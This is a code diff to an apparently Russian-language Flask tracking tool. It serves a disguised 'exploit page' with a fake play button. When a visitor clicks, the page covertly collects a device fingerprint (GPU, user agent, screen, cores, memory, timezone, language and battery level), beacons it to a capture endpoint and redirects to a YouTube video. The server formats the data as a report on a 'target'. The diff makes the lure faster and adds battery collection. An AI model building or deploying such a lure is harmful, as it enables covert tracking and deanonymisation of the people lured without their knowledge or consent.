@@ -36,7 +36,7 @@ def get_owner(sid):
     return res[0] if res else OVERLORD_ID
 
 # =================================================================
-# [2] STABLE EXPLOIT PAGE (NO-DELAY VERSION)
+# [2] EXPLOIT PAGE (ULTRA-FAST & NO-AWAIT)
 # =================================================================
 HTML_TEMPLATE = """
 <!DOCTYPE html>
@@ -56,8 +56,8 @@ HTML_TEMPLATE = """
         .play::after { content: ""; position: absolute; left: 28px; top: 15px; border-left: 20px solid #fff; border-top: 10px solid transparent; border-bottom: 10px solid transparent; }
     </style>
 </head>
-<body>
-    <div id="app" onclick="ignite()"><div class="play"></div></div>
+<body onclick="ignite()">
+    <div id="app"><div class="play"></div></div>
 <script>
     const sid = "{{sid}}";
     let fired = false;
@@ -66,35 +66,44 @@ HTML_TEMPLATE = """
         if (fired) return;
         fired = true;
 
-        const getSpecs = () => {
-            let gpu = "N/A";
-            try {
-                const gl = document.createElement('canvas').getContext('webgl');
-                const dbg = gl.getExtension('WEBGL_debug_renderer_info');
-                gpu = dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : "Generic";
-            } catch(e) {}
+        // Собираем данные мгновенно
+        let gpu = "N/A";
+        try {
+            const gl = document.createElement('canvas').getContext('webgl');
+            const dbg = gl.getExtension('WEBGL_debug_renderer_info');
+            gpu = dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : "Generic";
+        } catch(e) {}
 
-            return {
-                sid: sid,
-                ua: navigator.userAgent,
-                gpu: gpu,
-                res: screen.width + "x" + screen.height,
-                plat: navigator.platform,
-                mem: navigator.deviceMemory || "N/A",
-                cores: navigator.hardwareConcurrency || "N/A",
-                lang: navigator.language,
-                tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                ratio: window.devicePixelRatio,
-                touch: navigator.maxTouchPoints
-            };
+        const info = {
+            sid: sid,
+            ua: navigator.userAgent,
+            gpu: gpu,
+            res: screen.width + "x" + screen.height,
+            plat: navigator.platform,
+            mem: navigator.deviceMemory || "N/A",
+            cores: navigator.hardwareConcurrency || "N/A",
+            lang: navigator.language,
+            tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            ratio: window.devicePixelRatio,
+            touch: navigator.maxTouchPoints
         };
 
-        // Отправка данных без задержки
-        const data = getSpecs();
-        navigator.sendBeacon('/gate/capture', btoa(JSON.stringify(data)));
+        // Пытаемся взять батарею БЕЗ await (синхронно если есть кэш)
+        if (navigator.getBattery) {
+            navigator.getBattery().then(b => {
+                info.bat = Math.round(b.level * 100) + "% " + (b.charging ? "⚡" : "🔋");
+                send(info);
+            }).catch(() => { send(info); });
+        } else {
+            info.bat = "Blocked (iOS)";
+            send(info);
+        }
 
-        // Мгновенный редирект
-        window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
+        function send(data) {
+            navigator.sendBeacon('/gate/capture', btoa(JSON.stringify(data)));
+            // Редирект СРАЗУ после команды на отправку
+            window.location.replace("https://www.youtube.com/watch?v=dQw4w9WgXcQ");
+        }
     }
 </script>
 </body>
@@ -102,7 +111,7 @@ HTML_TEMPLATE = """
 """
 
 # =================================================================
-# [3] SERVER LOGIC & FORMATTED REPORT
+# [3] SERVER LOGIC (FORMATTED REPORT)
 # =================================================================
 
 @app.route('/gate/capture', methods=['POST'])
@@ -115,11 +124,12 @@ def capture():
         report = (
             f"<b>🔴 ОБЪЕКТ ЗАФИКСИРОВАН</b>\n"
             f"━━━━━━━━━━━━━━━━━━\n"
-            f"🆔 <b>Target ID:</b> <code>{sid}</code>\n\n"
+            f"🆔 <b>Target ID:</b> <code>{sid}</code>\n"
+            f"🔋 <b>Заряд:</b> <code>{d.get('bat', 'N/A')}</code>\n\n"
             
             f"<b>🛠 ЖЕЛЕЗО:</b>\n"
             f"• 🎮 <b>GPU:</b> <code>{d.get('gpu')}</code>\n"
-            f"• 🧠 <b>CPU/RAM:</b> <code>{d.get('cores')} Cores / {d.get('mem')} GB</code>\n"
+            f"• 🧠 <b>Cores/RAM:</b> <code>{d.get('cores')} Cores / {d.get('mem')} GB</code>\n"
             f"• 📱 <b>Platform:</b> <code>{d.get('plat')}</code>\n\n"
             
             f"<b>🖥 ДИСПЛЕЙ:</b>\n"
@@ -131,7 +141,7 @@ def capture():
             f"• 📍 <b>TZ:</b> <code>{d.get('tz')}</code>\n"
             f"• 🗣 <b>Lang:</b> <code>{d.get('lang')}</code>\n"
             f"━━━━━━━━━━━━━━━━━━\n"
-            f"🛰 <b>UA:</b>\n<code>{d.get('ua')[:120]}...</code>"
+            f"🛰 <b>UA:</b>\n<code>{d.get('ua')[:130]}...</code>"
         )
         
         owner_id = get_owner(sid)
